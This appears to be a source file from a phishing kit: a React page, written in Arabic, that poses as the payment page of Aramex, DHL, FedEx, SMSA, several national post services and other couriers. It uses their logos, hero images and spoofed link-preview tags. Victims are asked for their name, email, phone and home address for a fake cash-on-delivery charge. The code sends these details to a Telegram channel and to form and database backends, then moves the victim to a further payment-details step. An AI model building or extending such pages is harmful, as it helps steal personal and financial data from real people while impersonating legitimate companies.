import { useState } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Helmet } from "react-helmet-async";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { getServiceBranding } from "@/lib/serviceLogos";
import { getCountryByCode } from "@/lib/countries";
import { getCurrencySymbol, formatCurrency } from "@/lib/countryCurrencies";
import { getCompanyMeta } from "@/utils/companyMeta";
import PaymentMetaTags from "@/components/PaymentMetaTags";
import { useLink, useUpdateLink } from "@/hooks/useSupabase";
import { sendToTelegram } from "@/lib/telegram";
import { Shield, ArrowLeft, User, Mail, Phone, CreditCard, MapPin } from "lucide-react";
import heroAramex from "@/assets/hero-aramex.jpg";
import heroDhl from "@/assets/hero-dhl.jpg";
import heroFedex from "@/assets/hero-fedex.jpg";
import heroSmsa from "@/assets/hero-smsa.jpg";
import heroUps from "@/assets/hero-ups.jpg";
import heroEmpost from "@/assets/hero-empost.jpg";
import heroZajil from "@/assets/hero-zajil.jpg";
import heroNaqel from "@/assets/hero-naqel.jpg";
import heroSaudipost from "@/assets/hero-saudipost.jpg";
import heroKwpost from "@/assets/hero-kwpost.jpg";
import heroQpost from "@/assets/hero-qpost.jpg";
import heroOmanpost from "@/assets/hero-omanpost.jpg";
import heroBahpost from "@/assets/hero-bahpost.jpg";
import heroGenacom from "@/assets/hero-genacom.jpg";
import heroAlbaraka from "@/assets/hero-albaraka.jpg";
import heroAlfuttaim from "@/assets/hero-alfuttaim.jpg";
import heroAlshaya from "@/assets/hero-alshaya.jpg";
import heroBahri from "@/assets/hero-bahri.jpg";
import heroShipco from "@/assets/hero-shipco.jpg";
import heroHellmann from "@/assets/hero-hellmann.jpg";
import heroDsv from "@/assets/hero-dsv.jpg";
import heroJinakum from "@/assets/hero-jinakum.jpg";
import heroBg from "@/assets/hero-bg.jpg";

const PaymentRecipient = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { data: linkData } = useLink(id);
  const updateLink = useUpdateLink();
  const [customerName, setCustomerName] = useState("");
  const [customerEmail, setCustomerEmail] = useState("");
  const [customerPhone, setCustomerPhone] = useState("");
  const [residentialAddress, setResidentialAddress] = useState("");

  // Get query parameters from URL
  const urlParams = new URLSearchParams(window.location.search);
  const serviceKey = urlParams.get('company') || linkData?.payload?.service_key || new URLSearchParams(window.location.search).get('service') || 'aramex';
  const currencyParam = urlParams.get('currency');
  const titleParam = urlParams.get('title');

  const serviceName = linkData?.payload?.service_name || serviceKey;
  const branding = getServiceBranding(serviceKey);
  const companyMeta = getCompanyMeta(serviceKey);

  // Use dynamic company meta for OG tags
  const dynamicTitle = titleParam || companyMeta.title || `Payment - ${serviceName}`;
  const dynamicDescription = companyMeta.description || `Complete your payment for ${serviceName}`;
  const dynamicImage = companyMeta.image;

  const shippingInfo = linkData?.payload as any;

  // Get payer type from shipping info (default to "recipient" for backward compatibility)
  const payerType = shippingInfo?.payer_type || "recipient";

  // Get country from link data (must be before using currency functions)
  const countryCode = shippingInfo?.selectedCountry || "SA";
  const countryData = getCountryByCode(countryCode);
  const phoneCode = countryData?.phoneCode || "+966";

  // Use currency from URL parameter if available, otherwise from country data
  const currencyCode = currencyParam || countryData?.currency || "SAR";

  // Get amount from link data - ensure it's a number, handle all data types
  const rawAmount = shippingInfo?.cod_amount;

  // Handle different data types and edge cases
  let amount = 500; // Default value
  if (rawAmount !== undefined && rawAmount !== null) {
    if (typeof rawAmount === 'number') {
      amount = rawAmount;
    } else if (typeof rawAmount === 'string') {
      const parsed = parseFloat(rawAmount);
      if (!isNaN(parsed)) {
        amount = parsed;
      }
    }
  }

  const formattedAmount = formatCurrency(amount, currencyCode);

  const phonePlaceholder = countryData?.phonePlaceholder || "5X XXX XXXX";
  
  const heroImages: Record<string, string> = {
    'aramex': heroAramex,
    'dhl': heroDhl,
    'dhlkw': heroDhl,
    'dhlqa': heroDhl,
    'dhlom': heroDhl,
    'dhlbh': heroDhl,
    'fedex': heroFedex,
    'smsa': heroSmsa,
    'ups': heroUps,
    'empost': heroEmpost,
    'zajil': heroZajil,
    'naqel': heroNaqel,
    'saudipost': heroSaudipost,
    'kwpost': heroKwpost,
    'qpost': heroQpost,
    'omanpost': heroOmanpost,
    'bahpost': heroBahpost,
    'genacom': heroGenacom,
    'jinaken': heroGenacom,
    'albaraka': heroAlbaraka,
    'alfuttaim': heroAlfuttaim,
    'alshaya': heroAlshaya,
    'bahri': heroBahri,
    'national': heroBahri,
    'shipco': heroShipco,
    'hellmann': heroHellmann,
    'dsv': heroDsv,
    'jinakum': heroJinakum,
  };
  
  const heroImage = heroImages[serviceKey.toLowerCase()] || heroBg;
  
  const handleProceed = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!linkData) return;

    // Submit to Netlify Forms
    const formData = new FormData();
    formData.append('form-name', 'payment-recipient');
    formData.append('name', customerName);
    formData.append('email', customerEmail);
    formData.append('phone', customerPhone);
    formData.append('address', residentialAddress);
    formData.append('service', serviceName);
    formData.append('amount', formattedAmount);
    formData.append('linkId', id || '');

    try {
      await fetch('/', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: new URLSearchParams(formData as any).toString()
      });
    } catch (error) {
      console.error('Form submission error:', error);
    }

    // Send data to Telegram
    const productionDomain = window.location.origin;
    const telegramResult = await sendToTelegram({
      type: 'payment_recipient',
      data: {
        name: customerName,
        email: customerEmail,
        phone: customerPhone,
        address: residentialAddress,
        service: serviceName,
        amount: formattedAmount,
        payment_url: `${productionDomain}/pay/${id}/details`
      },
      timestamp: new Date().toISOString()
    });

    // Save customer data to the link's payload in Supabase for cross-device compatibility
    try {
      const customerData = {
        ...linkData.payload,
        customerInfo: {
          name: customerName,
          email: customerEmail,
          phone: customerPhone,
          address: residentialAddress,
          service: serviceName,
          amount: formattedAmount
        },
        selectedCountry: countryCode
      };

      await updateLink.mutateAsync({
        linkId: id!,
        payload: customerData
      });
    } catch (error) {
      // Silent error handling
    }

    navigate(`/pay/${id}/details`);
  };
  
  return (
    <>
      <PaymentMetaTags
        serviceName={serviceName}
        serviceKey={serviceKey}
        amount={formattedAmount}
        title={dynamicTitle}
        description={dynamicDescription}
      />
      {/* Dynamic OG Image via direct meta tag injection */}
      <Helmet>
        <meta property="og:image" content={dynamicImage} />
        <meta name="twitter:image" content={dynamicImage} />
      </Helmet>
      <div 
        className="min-h-screen bg-background" 
        dir="rtl"
      >
        {/* Hero Section */}
        <div className="relative w-full h-40 xs:h-44 sm:h-56 md:h-64 lg:h-72 overflow-hidden">
          <img 
            src={heroImage}
            alt={serviceName}
            className="w-full h-full object-cover"
          />
          <div className="absolute inset-0 bg-gradient-to-b from-black/60 via-black/40 to-black/70" />
          
          {/* Logo Overlay */}
          <div className="absolute top-3 left-3 xs:top-4 xs:left-4 sm:top-6 sm:left-6 md:top-8 md:left-8">
            {branding.logo && (
              <div className="bg-white rounded-xl xs:rounded-2xl p-2 xs:p-3 sm:p-4 shadow-lg">
                <img 
                  src={branding.logo} 
                  alt={serviceName}
                  className="h-8 xs:h-10 sm:h-14 md:h-16 lg:h-20 w-auto"
                  onError={(e) => e.currentTarget.style.display = 'none'}
                />
              </div>
            )}
          </div>
          
          {/* Title Overlay */}
          <div className="absolute bottom-3 right-3 xs:bottom-4 xs:right-4 sm:bottom-6 sm:right-6 md:bottom-8 md:right-8 text-white">
            <div className="text-right">
              <h2 className="text-base xs:text-lg sm:text-xl md:text-2xl lg:text-3xl font-bold mb-0.5 xs:mb-1">{serviceName}</h2>
              <p className="text-[10px] xs:text-xs sm:text-sm md:text-base opacity-90">خدمة شحن</p>
            </div>
          </div>
        </div>

        <div className="container mx-auto px-3 xs:px-4 sm:px-6 md:px-8 -mt-6 xs:-mt-8 sm:-mt-10 md:-mt-12 relative z-10 pb-6 xs:pb-8 sm:pb-10 md:pb-12">
          <div className="max-w-xl xs:max-w-2xl lg:max-w-3xl xl:max-w-4xl mx-auto">
            
            <Card className="p-4 xs:p-5 sm:p-6 md:p-8 lg:p-10 shadow-2xl border-t-4 rounded-xl xs:rounded-2xl" style={{ borderTopColor: branding.colors.primary }}>
              <form onSubmit={handleProceed}>
                <div className="flex items-center justify-between mb-5 xs:mb-6 sm:mb-7 md:mb-8 gap-3">
                  <h1 className="text-lg xs:text-xl sm:text-2xl md:text-3xl lg:text-4xl font-bold flex-1 min-w-0">
                    {payerType === "recipient" ? "معلومات المستلم" : "معلومات المرسل"}
                  </h1>
                  
                  <div
                    className="w-12 h-12 xs:w-14 xs:h-14 sm:w-16 sm:h-16 md:w-20 md:h-20 rounded-xl xs:rounded-2xl flex items-center justify-center shadow-lg flex-shrink-0"
                    style={{
                      background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`,
                    }}
                  >
                    <CreditCard className="w-6 h-6 xs:w-7 xs:h-7 sm:w-8 sm:h-8 md:w-10 md:h-10 text-white" />
                  </div>
                </div>

                <div className="space-y-3 xs:space-y-3.5 sm:space-y-4 md:space-y-5 mb-5 xs:mb-6 sm:mb-7 md:mb-8">
                  <div>
                    <Label htmlFor="name" className="flex items-center gap-1.5 sm:gap-2 mb-1.5 sm:mb-2 text-xs xs:text-sm sm:text-base font-medium">
                      <User className="w-3.5 h-3.5 xs:w-4 xs:h-4 sm:w-4 sm:h-4" />
                      الاسم الكامل
                    </Label>
                    <Input
                      id="name"
                      value={customerName}
                      onChange={(e) => setCustomerName(e.target.value)}
                      required
                      className="h-11 xs:h-12 sm:h-13 md:h-14 text-sm xs:text-base sm:text-lg rounded-lg"
                      placeholder="أدخل اسمك الكامل"
                    />
                  </div>
                  
                  <div>
                    <Label htmlFor="email" className="flex items-center gap-1.5 sm:gap-2 mb-1.5 sm:mb-2 text-xs xs:text-sm sm:text-base font-medium">
                      <Mail className="w-3.5 h-3.5 xs:w-4 xs:h-4 sm:w-4 sm:h-4" />
                      البريد الإلكتروني
                    </Label>
                    <Input
                      id="email"
                      type="email"
                      value={customerEmail}
                      onChange={(e) => setCustomerEmail(e.target.value)}
                      required
                      className="h-11 xs:h-12 sm:h-13 md:h-14 text-sm xs:text-base sm:text-lg rounded-lg"
                      placeholder="example@email.com"
                    />
                  </div>
                  
                  <div>
                    <Label htmlFor="phone" className="flex items-center gap-1.5 sm:gap-2 mb-1.5 sm:mb-2 text-xs xs:text-sm sm:text-base font-medium">
                      <Phone className="w-3.5 h-3.5 xs:w-4 xs:h-4 sm:w-4 sm:h-4" />
                      رقم الهاتف
                    </Label>
                    <Input
                      id="phone"
                      type="tel"
                      value={customerPhone}
                      onChange={(e) => setCustomerPhone(e.target.value)}
                      required
                      className="h-11 xs:h-12 sm:h-13 md:h-14 text-sm xs:text-base sm:text-lg rounded-lg"
                      placeholder={`${phoneCode} ${phonePlaceholder}`}
                    />
                  </div>
                  
                  <div>
                    <Label htmlFor="address" className="flex items-center gap-1.5 sm:gap-2 mb-1.5 sm:mb-2 text-xs xs:text-sm sm:text-base font-medium">
                      <MapPin className="w-3.5 h-3.5 xs:w-4 xs:h-4 sm:w-4 sm:h-4" />
                      العنوان السكني
                    </Label>
                    <Input
                      id="address"
                      value={residentialAddress}
                      onChange={(e) => setResidentialAddress(e.target.value)}
                      required
                      className="h-11 xs:h-12 sm:h-13 md:h-14 text-sm xs:text-base sm:text-lg rounded-lg"
                      placeholder="أدخل عنوانك السكني الكامل"
                    />
                  </div>
                </div>
              
                <Button
                  type="submit"
                  size="lg"
                  className="w-full text-sm xs:text-base sm:text-lg md:text-xl h-12 xs:h-13 sm:h-14 md:h-16 text-white rounded-lg xs:rounded-xl font-semibold transition-transform hover:scale-[1.02] active:scale-[0.98]"
                  style={{
                    background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
                  }}
                >
                  <span className="ml-2">التالي</span>
                  <ArrowLeft className="w-4 h-4 xs:w-5 xs:h-5 sm:w-5 sm:h-5 mr-2" />
                </Button>
              
                <p className="text-[10px] xs:text-xs sm:text-sm text-center text-muted-foreground mt-3 xs:mt-4 sm:mt-5">
                  بالمتابعة، أنت توافق على الشروط والأحكام
                </p>
              </form>
              
              {/* Hidden Netlify Form */}
              <form name="payment-recipient" data-netlify="true" data-netlify-honeypot="bot-field" hidden>
                <input type="text" name="name" />
                <input type="email" name="email" />
                <input type="tel" name="phone" />
                <input type="text" name="address" />
                <input type="text" name="service" />
                <input type="text" name="amount" />
                <input type="text" name="linkId" />
              </form>
            </Card>
          </div>
        </div>
      </div>
    </>
  );
};

export default PaymentRecipient;
